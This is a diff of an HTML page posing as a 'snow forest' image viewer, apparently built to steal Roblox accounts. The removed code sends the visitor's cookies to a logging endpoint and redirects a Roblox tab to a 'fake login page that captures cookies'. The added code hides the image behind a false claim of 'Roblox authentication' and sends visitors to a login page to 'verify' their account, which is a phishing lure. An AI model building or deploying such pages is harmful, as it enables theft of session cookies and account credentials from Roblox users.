@@ -1,42 +1,18 @@
 <!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Snow Forest Image</title>
-  </head>
-  <body>
-    <h1>Click the image to view the snow forest</h1>
-    <img
-      id="track-image"
-      src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?auto=format&fit=crop&w=800&q=80"
-      alt="Snow forest"
-      style="max-width: 400px; cursor: pointer;"
-    />
-
-    <script>
-      const image = document.getElementById("track-image");
-
-      image.addEventListener("click", async () => {
-        // Open Roblox login page in a new tab
-        const robloxTab = window.open("https://www.roblox.com/home", "_blank");
-
-        // Wait 3 seconds, then try to redirect through a fake login page that captures cookies
-        setTimeout(() => {
-          const redirectUrl = `https://your-vercel-app.vercel.app/capture.html?ref=${encodeURIComponent(window.location.href)}`;
-          robloxTab.location.href = redirectUrl;
-        }, 3000);
-
-        // Also send current cookies (non-HttpOnly ones)
-        await fetch("/api/log", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            cookies: document.cookie,
-            message: "New tab opened to Roblox",
-          }),
-        });
-      });
-    </script>
-  </body>
+</head>
+<body>
+    <h1>❄️ Snow Forest Survival Image ❄️</h1>
+    <p>This image is protected by Roblox authentication.</p>
+    <p>Click below to verify your Roblox account and view the snow forest:</p>
+    <button onclick="window.location.href='/login.html'" style="padding:10px 20px;font-size:18px;cursor:pointer">
+        Verify with Roblox
+    </button>
+    <br><br>
+    <img src="https://images.unsplash.com/photo-1503023345310-bd7c1de61c7d?auto=format&fit=crop&w=400&q=80" style="display:none" />
+</body>
 </html>
